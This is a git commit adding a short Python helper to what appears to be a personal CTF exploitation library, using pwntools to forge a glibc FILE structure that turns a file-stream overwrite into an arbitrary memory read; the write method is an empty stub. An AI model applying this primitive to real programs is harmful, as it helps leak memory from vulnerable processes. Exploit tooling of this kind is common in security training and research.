a176054a7d0c08e1e38d5174b711d411cb35b911
Naup <naup96721@gmail.com>
2024-09-08 21:08:41 +0800

    filestructure AAR

---
+++ MyPwnLib/NAUP_filestructure_lib.py
@@ -0,0 +1,18 @@
+from pwn import *
+
+class FILESTRUCTURE:
+    def __init__(self):
+        self.FS = FileStructure(0)
+    def aar(self,padding: bytes ,flags: int ,target_addr: int ,size: int ,lock_addr:int ):
+        self.FS.flags = flags
+        self.FS._IO_read_end = target_addr
+        self.FS._IO_write_base = target_addr
+        self.FS._IO_buf_end = target_addr + size
+        self.FS._IO_write_ptr = target_addr + size
+        self.FS._lock = lock_addr
+        self.FS.fileno = 1
+
+        return padding + bytes(self.FS)[:-8]
+
+    def aaw(self):
+        pass
